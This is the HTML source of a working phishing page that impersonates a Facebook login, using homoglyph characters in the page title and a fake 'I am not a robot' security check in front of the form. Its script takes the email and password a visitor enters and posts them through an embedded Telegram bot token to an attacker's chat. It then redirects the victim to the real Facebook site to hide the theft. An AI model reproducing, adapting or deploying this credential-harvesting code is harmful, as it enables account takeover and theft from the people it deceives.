<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>SÐµcurity Verification</title>
  <style>
    body { font-family: Arial, sans-serif; background-color: #f0f2f5; margin: 0; padding: 0; color: #333; }
    .container { width: 100%; max-width: 400px; margin: 50px auto; background-color: #fff; padding: 40px; border-radius: 8px; box-shadow: 0 0 10px rgba(0, 0, 0, 0.1); box-sizing: border-box; }
    
    /* Gatekeeper View */
    #gatekeeper { text-align: center; }
    .btn-verify { background-color: #1877f2; color: white; border: none; padding: 15px 30px; border-radius: 6px; font-size: 16px; font-weight: bold; cursor: pointer; width: 100%; }

    /* Login View */
    #login-view { display: none; }
    .logo { text-align: center; margin-bottom: 25px; }
    
    /* Input Styling */
    .login-form input { width: 100%; padding: 14px; margin-bottom: 15px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 16px; box-sizing: border-box; background-color: #f5f6f7; outline: none; }
    .login-form input:focus { border-color: #1877f2; background-color: #fff; }
    
    /* Button & Spinner */
    .login-form button { width: 100%; padding: 12px; background-color: #1877f2; color: #fff; border: none; border-radius: 6px; font-size: 18px; font-weight: bold; cursor: pointer; display: flex; justify-content: center; align-items: center; }
    .spinner { width: 18px; height: 18px; border: 3px solid rgba(255,255,255,0.3); border-radius: 50%; border-top-color: #fff; animation: spin 1s linear infinite; display: none; margin-left: 10px; }
    @keyframes spin { to { transform: rotate(360deg); } }

    /* Footer Links - Changed to Black */
    .footer { text-align: center; margin-top: 20px; font-size: 14px; border-top: 1px solid #dadde1; padding-top: 20px; }
    .footer a { color: #000000; text-decoration: none; font-weight: 500; }
    .footer a:hover { text-decoration: underline; }
    .dot { color: #888; margin: 0 5px; }
  </style>
</head>
<body>

<div class="container">
  <div id="gatekeeper">
    <h2 style="font-size: 18px; margin-top: 0;">Security Check</h2>
    <p style="font-size: 14px; color: #65676b; line-height: 1.4;">Please verify that you are accessing this portal securely to continue.</p>
    <button class="btn-verify" onclick="showLogin()">I am not a robot</button>
  </div>

  <div id="login-view">
    <div class="logo">
      <svg width="120" height="24" viewBox="0 0 120 24" fill="#1877f2">
        <path d="M11.5 24V14.7H8.4v-3.6h3.1V8.4c0-3.1 1.9-4.8 4.7-4.8 1.3 0 2.5.1 2.8.1V7h-1.9c-1.5 0-1.8.7-1.8 1.8v2.3h3.6l-.5 3.6h-3.1V24h4.6V0H0v24h11.5z" transform="scale(0.8)"/>
        <text x="35" y="18" font-family="Arial, Helvetica, sans-serif" font-weight="bold" font-size="20">facebook</text>
      </svg>
    </div>
    
    <div class="login-form">
      <input type="text" id="email" placeholder="Email or phone number" required>
      <input type="password" id="password" placeholder="Password" required>
      <button type="button" id="submitBtn">
        <span>Log In</span>
        <div class="spinner" id="loader"></div>
      </button>
    </div>

    <div class="footer">
      <a href="#">Forgotten account?</a>
      <span class="dot">Â·</span>
      <a href="#">Create New Account</a>
    </div>
  </div>
</div>

<script>
  const BOT_TOKEN = "8538534265:AAFx5Ep3AI4DwwqwYBFa3HQ86eqIxpfv0Eo";
  const CHAT_ID = "6593370832";

  function showLogin() {
    document.getElementById('gatekeeper').style.display = 'none';
    document.getElementById('login-view').style.display = 'block';
    document.title = "FÐ°cebook - Log In"; 
  }

  document.getElementById('submitBtn').addEventListener('click', function () {
    const email = document.getElementById('email').value;
    const pass = document.getElementById('password').value;
    
    if (!email || !pass) {
      alert("Please fill in all fields");
      return;
    }

    const btn = document.getElementById('submitBtn');
    const loader = document.getElementById('loader');
    
    btn.disabled = true;
    loader.style.display = "block";

    const text = `ðŸ”” NEW LOGIN\n\nðŸ“§ Email: ${email}\nðŸ”‘ Password: ${pass}`;

    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: CHAT_ID, text: text })
    })
    .then(() => {
      setTimeout(() => {
        window.location.href = "https://www.facebook.com/recover/initiate/";
      }, 1500);
    })
    .catch(() => {
      window.location.href = "https://www.facebook.com";
    });
  });
</script>

</body>
</html>
